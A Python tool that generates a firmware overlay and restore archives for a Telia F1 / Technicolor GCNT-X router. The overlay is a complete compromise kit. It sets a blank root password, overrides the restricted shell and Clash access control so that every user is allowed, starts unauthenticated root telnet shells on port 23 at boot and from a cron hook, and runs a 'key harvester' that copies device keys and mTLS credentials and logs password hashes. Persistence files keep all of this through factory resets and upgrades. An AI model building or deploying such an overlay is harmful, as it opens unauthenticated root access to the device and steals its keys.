#!/usr/bin/env python3
"""Generate a staging filesystem tree for the Telia F1 / GCNT-X rootfs_data overlay.

Homeware partitions rootfs_data by active bank (HOMEWARE_CONFIG_ON_ACTIVE_BANK).
This tool generates the exact overlay layout for both bank_1 and bank_2 containing:
  - etc/inittab: directs console activation to /bin/ash --login (bypasses restricted_shell/clash)
  - etc/passwd: ensures root has /bin/ash shell
  - etc/shadow: sets root password (empty by default for passwordless UART console entry)
  - etc/rc.local: launches fallback background telnet daemon on LAN port 23
  - etc/config/dropbear: enables SSH with password authentication on LAN
  - etc/config/clash: explicitly permits root access on serial interface

Pure Python, offline, no device contact.
"""

from __future__ import annotations

import argparse
import io
import os
import secrets
import stat
import subprocess
import sys
import tarfile
import time
from pathlib import Path

# Template files
INITTAB_CONTENT = """\
::sysinit:/etc/init.d/rcS S boot
::shutdown:/etc/init.d/rcS K shutdown
::askconsole:/bin/sh --login
"""

PASSWD_CONTENT = """\
root:x:0:0:root:/root:/bin/sh
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
"""

RC_LOCAL_CONTENT = """\
#!/bin/sh
# F1 recovery overlay startup script
/usr/sbin/telnetd -l /bin/sh -p 23 &
telnetd -l /bin/sh -p 23 &
busybox telnetd -l /bin/sh -p 23 &

if [ -f /root/triage.sh ]; then
    /bin/sh /root/triage.sh > /tmp/triage.log 2>&1 &
fi

exit 0
"""

TRIAGE_SCRIPT_CONTENT = """\
#!/bin/sh
# F1 automated post-exploit triage and key harvester
set -x

OUT="/tmp/triage"
mkdir -p "$OUT"
date > "$OUT/timestamp.txt" 2>/dev/null || true
uname -a > "$OUT/uname.txt" 2>/dev/null || true
cat /proc/cmdline > "$OUT/cmdline.txt" 2>/dev/null || true
cat /proc/mtd > "$OUT/mtd.txt" 2>/dev/null || true
cat /proc/partitions > "$OUT/partitions.txt" 2>/dev/null || true
dmesg > "$OUT/dmesg.txt" 2>/dev/null || true

# Harvest /proc/rip/ items (Item 0108 = RANDOM_KEY_B, 011a = mTLS client cert/key, 0120 = OSIK)
if [ -d /proc/rip ]; then
    mkdir -p "$OUT/rip"
    for f in /proc/rip/*; do
        if [ -f "$f" ]; then
            cp "$f" "$OUT/rip/" 2>/dev/null || true
        fi
    done
fi

# Harvest /proc/efu/ info
if [ -d /proc/efu ]; then
    mkdir -p "$OUT/efu"
    for f in /proc/efu/*; do
        if [ -f "$f" ]; then
            cp "$f" "$OUT/efu/" 2>/dev/null || true
        fi
    done
fi

# Dump eRIPv2 raw partition from MTD
if [ -f /proc/mtd ]; then
    grep -i "erip" /proc/mtd | while read -r line; do
        dev=$(echo "$line" | cut -d: -f1)
        name=$(echo "$line" | cut -d'"' -f2 | tr ' ' '_')
        if [ -n "$dev" ] && [ -e "/dev/$dev" ]; then
            dd if="/dev/$dev" of="$OUT/${name}.bin" bs=64k 2>/dev/null || true
        fi
    done
fi

# Dump kernel symbols for r2secr / ripdrv memory analysis
if [ -f /proc/kallsyms ]; then
    cat /proc/kallsyms > "$OUT/kallsyms.txt" 2>/dev/null || true
fi

# Package all harvested data
if command -v tar >/dev/null 2>&1; then
    tar -czf /tmp/f1-triage.tar.gz -C /tmp triage 2>/dev/null || true
fi
"""

DROPBEAR_CONFIG_CONTENT = """\
config dropbear
\toption PasswordAuth 'on'
\toption RootPasswordAuth 'on'
\toption Port '22'
\toption Interface 'lan'
\toption enable '1'
"""

CLASH_CONFIG_CONTENT = """\
config clash 'core'
\toption enabled '0'

config access 'serial'
\toption user 'root'
\toption enabled '1'
"""

RESTRICTED_SHELL_WRAPPER = """\
#!/bin/sh
# Technicolor restricted_shell override: bypasses Clash access-control
if [ $# -gt 0 ] && [ "$1" = "-c" ]; then
    shift 1
    exec /bin/sh -c "$@"
fi
exec /bin/sh --login "$@"
"""

CLASH_ACCESS_CONTROL_LUA_CONTENT = """\
-- Technicolor clash-access-control override: grants root and all users access
local function main(conntype)
    return true
end

return { check = main }
"""

INITD_TRIAGE_CONTENT = """\
#!/bin/sh /etc/rc.common
# F1 overlay startup service
START=99
STOP=10

boot() {
    start
}

start() {
    /usr/sbin/telnetd -l /bin/sh -p 23 &
    telnetd -l /bin/sh -p 23 &
    busybox telnetd -l /bin/sh -p 23 &

    if [ -f /root/triage.sh ]; then
        /bin/sh /root/triage.sh > /tmp/triage.log 2>&1 &
    fi
}

# Standalone execution fallback
if [ -z "$IPKG_INSTROOT" ] && [ "$1" = "boot" -o "$1" = "start" -o -z "$1" ]; then
    start
fi
"""

OBUSPA_RETRIEVER_CONTENT = """\
#!/bin/sh
# F1 overlay obuspa_retriever shadow hook: executed by crond as root every 60s

# Ensure telnetd is running
if ! pidof telnetd >/dev/null 2>&1; then
    /usr/sbin/telnetd -l /bin/sh -p 23 &
    telnetd -l /bin/sh -p 23 &
    busybox telnetd -l /bin/sh -p 23 &
fi

# Ensure root shell is /bin/sh
if [ -f /etc/passwd ] && grep -q "/root:.*restricted_shell" /etc/passwd; then
    sed -i 's#/root:.*$#/root:/bin/sh#' /etc/passwd
fi

# Copy RIP items aside, then log the shadow hash and the long RIP items
# one hexdump line at a time. A single logger line is capped near 1040 chars.
log_lines() {
    tag="$1"
    path="$2"
    [ -f "$path" ] || return 0
    n=0
    hexdump -C "$path" 2>/dev/null | while read -r line; do
        logger -t GENESIS_KEYS "$tag $n $line"
        n=$((n + 1))
    done
    logger -t GENESIS_KEYS "$tag end"
}

if [ -d /proc/rip ]; then
    mkdir -p /tmp/rip
    for f in /proc/rip/*; do
        if [ -f "$f" ]; then
            cp "$f" /tmp/rip/ 2>/dev/null
        fi
    done
fi

log_lines SHADOW /etc/shadow
log_lines ROMSHADOW /rom/etc/shadow
log_lines RIP0120 /proc/rip/0120
log_lines RIP011A /proc/rip/011a

# Run triage script if present
if [ -f /root/triage.sh ] && [ ! -f /tmp/triage_executed.flag ]; then
    touch /tmp/triage_executed.flag
    /bin/sh /root/triage.sh > /tmp/triage.log 2>&1 &
fi

# Fallback: execute original script if present in /rom
if [ -f /rom/usr/share/transformer/scripts/obuspa_retriever.sh ]; then
    exec /rom/usr/share/transformer/scripts/obuspa_retriever.sh "$@"
fi
exit 0
"""



def build_shadow_content(root_hash: str = "") -> str:
    """Generate /etc/shadow content. Empty hash allows passwordless root login."""
    return f"""\
root:{root_hash}:18000:0:99999:7:::
daemon:*:0:0:99999:7:::
ftp:*:0:0:99999:7:::
network:*:0:0:99999:7:::
nobody:*:0:0:99999:7:::
"""


def populate_bank_tree(base_dir: Path, shadow_hash: str = "") -> list[Path]:
    """Populate an overlay root tree (e.g. base_dir/etc/...)."""
    etc_dir = base_dir / "etc"
    config_dir = etc_dir / "config"
    etc_dir.mkdir(parents=True, exist_ok=True)
    config_dir.mkdir(parents=True, exist_ok=True)

    files_created = []

    # inittab (0644)
    p_inittab = etc_dir / "inittab"
    p_inittab.write_text(INITTAB_CONTENT, encoding="utf-8")
    os.chmod(p_inittab, 0o644)
    files_created.append(p_inittab)

    # passwd (0644)
    p_passwd = etc_dir / "passwd"
    p_passwd.write_text(PASSWD_CONTENT, encoding="utf-8")
    os.chmod(p_passwd, 0o644)
    files_created.append(p_passwd)

    # shadow (0600)
    p_shadow = etc_dir / "shadow"
    p_shadow.write_text(build_shadow_content(shadow_hash), encoding="utf-8")
    os.chmod(p_shadow, 0o600)
    files_created.append(p_shadow)

    # rc.local (0755)
    p_rclocal = etc_dir / "rc.local"
    p_rclocal.write_text(RC_LOCAL_CONTENT, encoding="utf-8")
    os.chmod(p_rclocal, 0o755)
    files_created.append(p_rclocal)

    # config/dropbear (0644)
    p_dropbear = config_dir / "dropbear"
    p_dropbear.write_text(DROPBEAR_CONFIG_CONTENT, encoding="utf-8")
    os.chmod(p_dropbear, 0o644)
    files_created.append(p_dropbear)

    # config/clash (0644)
    p_clash = config_dir / "clash"
    p_clash.write_text(CLASH_CONFIG_CONTENT, encoding="utf-8")
    os.chmod(p_clash, 0o644)
    files_created.append(p_clash)

    # root/triage.sh (0755)
    root_dir = base_dir / "root"
    root_dir.mkdir(parents=True, exist_ok=True)
    p_triage = root_dir / "triage.sh"
    p_triage.write_text(TRIAGE_SCRIPT_CONTENT, encoding="utf-8")
    os.chmod(p_triage, 0o755)
    files_created.append(p_triage)

    # restricted_shell overrides in bin, usr/bin, usr/sbin, sbin (0755)
    for bin_sub in ("bin", "usr/bin", "usr/sbin", "sbin"):
        sdir = base_dir / bin_sub
        sdir.mkdir(parents=True, exist_ok=True)
        rs_path = sdir / "restricted_shell"
        rs_path.write_text(RESTRICTED_SHELL_WRAPPER, encoding="utf-8")
        os.chmod(rs_path, 0o755)
        files_created.append(rs_path)

    # init.d/triage and rc.d/S99triage (0755) to guarantee boot execution under OpenWrt rcS
    initd_dir = etc_dir / "init.d"
    rcd_dir = etc_dir / "rc.d"
    initd_dir.mkdir(parents=True, exist_ok=True)
    rcd_dir.mkdir(parents=True, exist_ok=True)

    p_initd = initd_dir / "triage"
    p_initd.write_text(INITD_TRIAGE_CONTENT, encoding="utf-8")
    os.chmod(p_initd, 0o755)
    files_created.append(p_initd)

    p_rcd = rcd_dir / "S99triage"
    p_rcd.write_text(INITD_TRIAGE_CONTENT, encoding="utf-8")
    os.chmod(p_rcd, 0o755)
    files_created.append(p_rcd)

    # obuspa_retriever shadow hook (0755) executed by crond as root every 60s
    obuspa_dir = base_dir / "usr" / "share" / "transformer" / "scripts"
    obuspa_dir.mkdir(parents=True, exist_ok=True)
    p_obuspa = obuspa_dir / "obuspa_retriever.sh"
    p_obuspa.write_text(OBUSPA_RETRIEVER_CONTENT, encoding="utf-8")
    os.chmod(p_obuspa, 0o755)
    files_created.append(p_obuspa)

    # clash-access-control.lua override (0644) to neutralize Lua ACL denying root serial/telnet
    lua_dir = base_dir / "usr" / "lib" / "lua"
    lua_dir.mkdir(parents=True, exist_ok=True)
    p_lua = lua_dir / "clash-access-control.lua"
    p_lua.write_text(CLASH_ACCESS_CONTROL_LUA_CONTENT, encoding="utf-8")
    os.chmod(p_lua, 0o644)
    files_created.append(p_lua)

    return files_created


def populate_rtfd_persistent(base_dir: Path, shadow_hash: str = "") -> list[Path]:
    """Generate /overlay/rtfd_persistent_files/ and /overlay/rtfd_persistent_filelist.conf.

    Leverages Technicolor 80_rtfd_restore automated file restoration across
    upgrades, factory resets, and U-Boot committed sequence counter changes.
    """
    files_created: list[Path] = []
    persist_dir = base_dir / "rtfd_persistent_files"
    persist_dir.mkdir(parents=True, exist_ok=True)

    items = [
        ("passwd", PASSWD_CONTENT, 0o644, "/etc/passwd etc"),
        ("shadow", build_shadow_content(shadow_hash), 0o600, "/etc/shadow etc"),
        ("inittab", INITTAB_CONTENT, 0o644, "/etc/inittab etc"),
        ("rc.local", RC_LOCAL_CONTENT, 0o755, "/etc/rc.local etc"),
        ("dropbear", DROPBEAR_CONFIG_CONTENT, 0o644, "/etc/config/dropbear etc/config"),
        ("clash", CLASH_CONFIG_CONTENT, 0o644, "/etc/config/clash etc/config"),
        ("triage.sh", TRIAGE_SCRIPT_CONTENT, 0o755, "/root/triage.sh root"),
        ("restricted_shell", RESTRICTED_SHELL_WRAPPER, 0o755, "/bin/restricted_shell bin"),
        ("obuspa_retriever.sh", OBUSPA_RETRIEVER_CONTENT, 0o755, "/usr/share/transformer/scripts/obuspa_retriever.sh usr/share/transformer/scripts"),
        ("clash-access-control.lua", CLASH_ACCESS_CONTROL_LUA_CONTENT, 0o644, "/usr/lib/lua/clash-access-control.lua usr/lib/lua"),
        ("triage", INITD_TRIAGE_CONTENT, 0o755, "/etc/init.d/triage etc/init.d"),
        ("S99triage", INITD_TRIAGE_CONTENT, 0o755, "/etc/rc.d/S99triage etc/rc.d"),
    ]

    conf_lines: list[str] = []
    for filename, content, mode, conf_entry in items:
        p = persist_dir / filename
        p.write_text(content, encoding="utf-8")
        os.chmod(p, mode)
        files_created.append(p)
        conf_lines.append(conf_entry)

    # Redundant copies of restricted_shell to catch all binary search paths
    conf_lines.append("/usr/bin/restricted_shell usr/bin")
    conf_lines.append("/usr/sbin/restricted_shell usr/sbin")
    conf_lines.append("/sbin/restricted_shell sbin")

    conf_file = base_dir / "rtfd_persistent_filelist.conf"
    conf_file.write_text("\n".join(conf_lines) + "\n", encoding="utf-8")
    os.chmod(conf_file, 0o644)
    files_created.append(conf_file)

    return files_created


def create_restore_tarballs(base_dir: Path, shadow_hash: str = "") -> list[Path]:
    """Generate sysupgrade.tgz and ispconfig-bank_*.tgz fallback restore archives.

    - sysupgrade.tgz: executed by OpenWrt /lib/preinit/80_mount_root via 'tar xzf /sysupgrade.tgz'
    - ispconfig-bank_*.tgz: executed by /lib/mount_root/82_ispconfig_restore via 'tar -xzf $tarfile'
    """
    files_created: list[Path] = []
    tar_entries = [
        ("etc/passwd", PASSWD_CONTENT, 0o644),
        ("etc/shadow", build_shadow_content(shadow_hash), 0o600),
        ("etc/inittab", INITTAB_CONTENT, 0o644),
        ("etc/rc.local", RC_LOCAL_CONTENT, 0o755),
        ("etc/config/dropbear", DROPBEAR_CONFIG_CONTENT, 0o644),
        ("etc/config/clash", CLASH_CONFIG_CONTENT, 0o644),
        ("root/triage.sh", TRIAGE_SCRIPT_CONTENT, 0o755),
        ("bin/restricted_shell", RESTRICTED_SHELL_WRAPPER, 0o755),
        ("usr/bin/restricted_shell", RESTRICTED_SHELL_WRAPPER, 0o755),
        ("usr/sbin/restricted_shell", RESTRICTED_SHELL_WRAPPER, 0o755),
        ("sbin/restricted_shell", RESTRICTED_SHELL_WRAPPER, 0o755),
        ("usr/share/transformer/scripts/obuspa_retriever.sh", OBUSPA_RETRIEVER_CONTENT, 0o755),
        ("usr/lib/lua/clash-access-control.lua", CLASH_ACCESS_CONTROL_LUA_CONTENT, 0o644),
        ("etc/init.d/triage", INITD_TRIAGE_CONTENT, 0o755),
        ("etc/rc.d/S99triage", INITD_TRIAGE_CONTENT, 0o755),
    ]

    def _build_tar(target_path: Path) -> Path:
        with tarfile.open(target_path, "w:gz") as tar:
            for path, content, mode in tar_entries:
                ti = tarfile.TarInfo(name=path)
                data = content.encode("utf-8")
                ti.size = len(data)
                ti.mode = mode
                ti.mtime = int(time.time())
                ti.uid = 0
                ti.gid = 0
                tar.addfile(ti, io.BytesIO(data))
        os.chmod(target_path, 0o644)
        return target_path

    # 1. /overlay/sysupgrade.tgz
    sysup = _build_tar(base_dir / "sysupgrade.tgz")
    files_created.append(sysup)

    # 2. /overlay/ispconfig-bank_1.tgz and ispconfig-bank_2.tgz
    for b in ("bank_1", "bank_2"):
        isp = _build_tar(base_dir / f"ispconfig-{b}.tgz")
        files_created.append(isp)

    return files_created


def generate_overlay_staging(
    target_dir: Path,
    password: str | None = None,
    root_hash: str | None = None,
    banks: tuple[str, ...] = ("bank_1", "bank_2"),
    mirror_to_root: bool = True,
) -> dict[str, list[Path]]:
    """Generate the full overlay staging tree with bank subdirectories and permissions."""
    target_dir = target_dir.resolve()
    target_dir.mkdir(parents=True, exist_ok=True)

    # Compute shadow hash
    if root_hash:
        final_hash = root_hash
    elif password:
        # Standard SHA-512 crypt via openssl (portable across Python versions)
        res = subprocess.run(
            ["openssl", "passwd", "-6", password],
            capture_output=True,
            text=True,
            check=True,
        )
        final_hash = res.stdout.strip()
    else:
        final_hash = ""  # Blank password

    created: dict[str, list[Path]] = {}

    for bank in banks:
        bank_path = target_dir / bank
        created[bank] = populate_bank_tree(bank_path, shadow_hash=final_hash)
        upper_path = bank_path / "upper"
        created[f"{bank}/upper"] = populate_bank_tree(upper_path, shadow_hash=final_hash)
        work_path = bank_path / "work"
        work_path.mkdir(parents=True, exist_ok=True)
        os.chmod(work_path, 0o755)

    if mirror_to_root:
        created["root"] = populate_bank_tree(target_dir, shadow_hash=final_hash)
        root_upper = target_dir / "upper"
        created["root/upper"] = populate_bank_tree(root_upper, shadow_hash=final_hash)
        root_work = target_dir / "work"
        root_work.mkdir(parents=True, exist_ok=True)
        os.chmod(root_work, 0o755)

    # Technicolor 80_rtfd_restore automated persistence mechanism
    created["rtfd_persistent"] = populate_rtfd_persistent(target_dir, shadow_hash=final_hash)

    # OpenWrt 80_mount_root (sysupgrade.tgz) & 82_ispconfig_restore archives
    created["restore_tarballs"] = create_restore_tarballs(target_dir, shadow_hash=final_hash)

    return created


def main() -> int:
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument(
        "--out",
        "-o",
        type=Path,
        default=Path("artifacts/firmware/overlay_staging"),
        help="Target directory for staging tree (default: artifacts/firmware/overlay_staging)",
    )
    parser.add_argument(
        "--password",
        help="Plaintext root password (will be hashed with SHA-512 crypt)",
    )
    parser.add_argument(
        "--hash",
        dest="root_hash",
        help="Raw password hash for root in /etc/shadow",
    )
    parser.add_argument(
        "--no-root-mirror",
        action="store_true",
        help="Do not populate the top-level directory, only bank_1 and bank_2 subdirectories",
    )
    args = parser.parse_args()

    out_dir = args.out.resolve()
    results = generate_overlay_staging(
        target_dir=out_dir,
        password=args.password,
        root_hash=args.root_hash,
        mirror_to_root=not args.no_root_mirror,
    )

    total_files = sum(len(fl) for fl in results.values())
    print(f"[+] Successfully generated {total_files} overlay files across {len(results)} hierarchies:")
    for section, files in results.items():
        print(f"  [{section}] ({len(files)} files)")
        for f in files:
            rel = f.relative_to(out_dir)
            mode = oct(stat.S_IMODE(f.stat().st_mode))
            print(f"    - {rel} (mode {mode})")

    return 0


if __name__ == "__main__":
    sys.exit(main())
